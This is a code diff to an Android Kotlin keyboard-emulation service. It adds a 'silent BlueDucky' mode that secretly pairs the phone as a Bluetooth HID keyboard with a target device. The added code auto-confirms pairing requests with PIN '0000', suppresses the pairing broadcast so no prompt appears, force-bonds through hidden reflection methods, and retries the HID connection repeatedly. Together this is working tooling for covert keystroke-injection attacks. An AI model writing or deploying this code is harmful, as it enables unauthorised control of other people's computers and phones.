@@ -12,8 +12,10 @@ import android.bluetooth.BluetoothHidDeviceAppQosSettings
 import android.bluetooth.BluetoothHidDeviceAppSdpSettings
 import android.bluetooth.BluetoothManager
 import android.bluetooth.BluetoothProfile
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.os.Binder
 import android.os.Build
@@ -25,8 +27,8 @@ import androidx.annotation.RequiresPermission
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.droid.dolphy.R
-import com.droid.dolphy.hid.comboDescriptor
 import java.util.concurrent.Executors
+import java.util.concurrent.atomic.AtomicBoolean
 
 
 
@@ -49,6 +51,11 @@ class KeyboardService : Service() {
                 )
             } else null
         }
+
+        
+        private const val TRANSPORT_BREDR = 1
+        private const val SILENT_RETRY_MS = 1200L
+        private const val SILENT_RETRY_MAX = 12
     }
 
     private val tag = "KeyboardService"
@@ -69,6 +76,106 @@ class KeyboardService : Service() {
 
     private var pendingDeviceAddress: String? = null
 
+    
+    @Volatile
+    private var silentBlueDuckyMode = false
+    private val silentPairingReceiverRegistered = AtomicBoolean(false)
+    private var silentRetryCount = 0
+    private val silentRetryRunnable = object : Runnable {
+        override fun run() {
+            if (!silentBlueDuckyMode) return
+            if (currentState == BluetoothProfile.STATE_CONNECTED) {
+                Log.i(tag, "BlueDucky: connected — stop retries")
+                return
+            }
+            if (silentRetryCount >= SILENT_RETRY_MAX) {
+                Log.w(tag, "BlueDucky: max retries reached")
+                return
+            }
+            silentRetryCount++
+            Log.i(tag, "BlueDucky: retry connect #$silentRetryCount")
+            initiateConnect()
+            mainHandler.postDelayed(this, SILENT_RETRY_MS)
+        }
+    }
+
+    
+    private val silentPairingReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (!silentBlueDuckyMode) return
+            when (intent.action) {
+                BluetoothDevice.ACTION_PAIRING_REQUEST -> {
+                    if (!hasConnectPermission()) return
+                    val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
+                    } ?: return
+                    val target = pendingDeviceAddress
+                    if (target != null && !device.address.equals(target, ignoreCase = true)) {
+                        Log.d(tag, "BlueDucky: pairing for other device ${device.address}, ignore")
+                        return
+                    }
+                    val variant = intent.getIntExtra(
+                        BluetoothDevice.EXTRA_PAIRING_VARIANT,
+                        BluetoothDevice.ERROR,
+                    )
+                    Log.i(tag, "BlueDucky: auto-confirm pairing variant=$variant for ${device.address}")
+                    try {
+                        when (variant) {
+                            BluetoothDevice.PAIRING_VARIANT_PIN,
+                            0,
+                            7  -> {
+                                val pinBytes = "0000".toByteArray(Charsets.UTF_8)
+                                runCatching { device.setPin(pinBytes) }
+                                runCatching {
+                                    val m = device.javaClass.getMethod(
+                                        "setPasskey",
+                                        Int::class.javaPrimitiveType,
+                                    )
+                                    m.invoke(device, 0)
+                                }
+                            }
+                            BluetoothDevice.PAIRING_VARIANT_PASSKEY_CONFIRMATION,
+                            2, 3  -> {
+                                runCatching { device.setPairingConfirmation(true) }
+                            }
+                            4, 5  -> {
+                                runCatching { device.setPairingConfirmation(true) }
+                            }
+                            else -> {
+                                runCatching { device.setPairingConfirmation(true) }
+                                runCatching { device.setPin("0000".toByteArray(Charsets.UTF_8)) }
+                            }
+                        }
+                        try {
+                            abortBroadcast()
+                        } catch (_: Exception) {
+                        }
+                    } catch (t: Throwable) {
+                        Log.w(tag, "BlueDucky: pairing auto-confirm failed: ${t.message}")
+                    }
+                }
+                BluetoothDevice.ACTION_BOND_STATE_CHANGED -> {
+                    if (!hasConnectPermission()) return
+                    val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
+                    } ?: return
+                    val target = pendingDeviceAddress ?: return
+                    if (!device.address.equals(target, ignoreCase = true)) return
+                    val state = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.ERROR)
+                    if (state == BluetoothDevice.BOND_BONDED) {
+                        Log.i(tag, "BlueDucky: bond complete → proxy.connect")
+                        mainHandler.post { forceProxyConnect(device) }
+                    }
+                }
+            }
+        }
+    }
 
     private var connection: Connection? = null
     private var currentDevice: BluetoothDevice? = null
@@ -133,6 +240,11 @@ class KeyboardService : Service() {
                     when (state) {
                         BluetoothProfile.STATE_CONNECTED -> {
                             Log.d(tag, "Creating Connection and injecting proxy...")
+                            if (silentBlueDuckyMode) {
+                                Log.i(tag, "BlueDucky: HID CONNECTED — disabling silent mode")
+                                stopSilentRetries()
+                                mainHandler.postDelayed({ setSilentBlueDuckyMode(false) }, 1500L)
+                            }
                             val proxy = hidDeviceProxy
                             if (proxy == null) {
                                 Log.e(tag, "ERROR: hidDeviceProxy is null when connection established!")
@@ -188,6 +300,8 @@ class KeyboardService : Service() {
     }
 
     override fun onDestroy() {
+        stopSilentRetries()
+        setSilentBlueDuckyMode(false)
         connection?.close()
         releaseHidProxy()
         super.onDestroy()
@@ -214,12 +328,11 @@ class KeyboardService : Service() {
 
 
     fun setTargetDeviceAddress(address: String) {
+        setSilentBlueDuckyMode(false)
         pendingDeviceAddress = address
         if (appRegistered) {
             initiateConnect()
         } else {
-
-
             if (hidDeviceProxy == null) requestHidProxy()
         }
     }
@@ -229,18 +342,39 @@ class KeyboardService : Service() {
 
 
     fun connectDirect(address: String) {
+        setSilentBlueDuckyMode(false)
         pendingDeviceAddress = address
         if (appRegistered) {
             initiateConnect()
         } else {
             if (hidDeviceProxy == null) requestHidProxy()
-
         }
     }
+
+    
+    fun connectSilentBlueDucky(address: String) {
+        Log.i(tag, "connectSilentBlueDucky → $address")
+        pendingDeviceAddress = address
+        setSilentBlueDuckyMode(true)
+        silentRetryCount = 0
+        stopSilentRetries()
+
+        if (appRegistered) {
+            initiateConnect()
+            mainHandler.postDelayed(silentRetryRunnable, SILENT_RETRY_MS)
+        } else {
+            if (hidDeviceProxy == null) requestHidProxy()
+            mainHandler.postDelayed(silentRetryRunnable, SILENT_RETRY_MS)
+        }
+    }
+
+    fun isSilentBlueDuckyMode(): Boolean = silentBlueDuckyMode
 
     @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
     fun disconnect() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return
+        stopSilentRetries()
+        setSilentBlueDuckyMode(false)
         val conn = connection ?: return
         conn.close()
         connection = null
@@ -299,6 +433,11 @@ class KeyboardService : Service() {
             null
         } ?: return
 
+        if (silentBlueDuckyMode) {
+            initiateSilentBlueDuckyConnect(device, proxy)
+            return
+        }
+
         val bondState = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
         if (bondState != BluetoothDevice.BOND_BONDED) {
             if (bondState == BluetoothDevice.BOND_BONDING) {
@@ -313,11 +452,112 @@ class KeyboardService : Service() {
             return
         }
 
-        Log.i(tag, "Calling proxy.connect(${device.address})")
-        try {
-            proxy.connect(device)
+        forceProxyConnect(device)
+    }
+
+    
+    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
+    private fun initiateSilentBlueDuckyConnect(device: BluetoothDevice, proxy: BluetoothHidDevice) {
+        val bondState = runCatching { device.bondState }.getOrDefault(BluetoothDevice.BOND_NONE)
+        Log.i(
+            tag,
+            "BlueDucky connect: ${device.address} bond=$bondState registered=$appRegistered",
+        )
+
+        runCatching { bluetoothAdapter?.cancelDiscovery() }
+
+        if (bondState == BluetoothDevice.BOND_BONDING) {
+            Log.i(tag, "BlueDucky: cancel stuck bonding via removeBond")
+            runCatching {
+                device.javaClass.getMethod("cancelBondProcess").invoke(device)
+            }
+            runCatching {
+                device.javaClass.getMethod("removeBond").invoke(device)
+            }
+        }
+
+        val connected = forceProxyConnect(device)
+        Log.i(tag, "BlueDucky: proxy.connect result=$connected")
+
+        if (bondState == BluetoothDevice.BOND_NONE) {
+            val bondOk = createBondSilent(device)
+            Log.i(tag, "BlueDucky: silent createBond started=$bondOk")
+        }
+
+        mainHandler.postDelayed({
+            if (silentBlueDuckyMode && currentState != BluetoothProfile.STATE_CONNECTED) {
+                forceProxyConnect(device)
+            }
+        }, 400L)
+    }
+
+    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
+    private fun forceProxyConnect(device: BluetoothDevice): Boolean {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) return false
+        val proxy = hidDeviceProxy ?: return false
+        return try {
+            runCatching { proxy.disconnect(device) }
+            val ok = proxy.connect(device)
+            Log.i(tag, "proxy.connect(${device.address}) → $ok")
+            ok
         } catch (e: Exception) {
             Log.e(tag, "proxy.connect failed: ${e.message}")
+            false
+        }
+    }
+
+    
+    @RequiresPermission(Manifest.permission.BLUETOOTH_CONNECT)
+    private fun createBondSilent(device: BluetoothDevice): Boolean {
+        val viaTransport = runCatching {
+            val m = device.javaClass.getMethod("createBond", Int::class.javaPrimitiveType)
+            m.invoke(device, TRANSPORT_BREDR) as? Boolean ?: false
+        }.getOrDefault(false)
+        if (viaTransport) return true
+        return runCatching { device.createBond() }.getOrDefault(false)
+    }
+
+    private fun setSilentBlueDuckyMode(enabled: Boolean) {
+        silentBlueDuckyMode = enabled
+        if (enabled) {
+            registerSilentPairingReceiver()
+        } else {
+            unregisterSilentPairingReceiver()
+            stopSilentRetries()
+        }
+    }
+
+    private fun stopSilentRetries() {
+        mainHandler.removeCallbacks(silentRetryRunnable)
+    }
+
+    private fun registerSilentPairingReceiver() {
+        if (!silentPairingReceiverRegistered.compareAndSet(false, true)) return
+        val filter = IntentFilter().apply {
+            addAction(BluetoothDevice.ACTION_PAIRING_REQUEST)
+            addAction(BluetoothDevice.ACTION_BOND_STATE_CHANGED)
+            priority = IntentFilter.SYSTEM_HIGH_PRIORITY
+        }
+        try {
+            ContextCompat.registerReceiver(
+                this,
+                silentPairingReceiver,
+                filter,
+                ContextCompat.RECEIVER_EXPORTED,
+            )
+            Log.i(tag, "BlueDucky: silent pairing receiver registered")
+        } catch (t: Throwable) {
+            silentPairingReceiverRegistered.set(false)
+            Log.w(tag, "BlueDucky: register pairing receiver failed: ${t.message}")
+        }
+    }
+
+    private fun unregisterSilentPairingReceiver() {
+        if (!silentPairingReceiverRegistered.compareAndSet(true, false)) return
+        try {
+            unregisterReceiver(silentPairingReceiver)
+            Log.i(tag, "BlueDucky: silent pairing receiver unregistered")
+        } catch (_: Exception) {
         }
     }
 
@@ -438,3 +678,4 @@ class KeyboardService : Service() {
         }
     }
 }
+
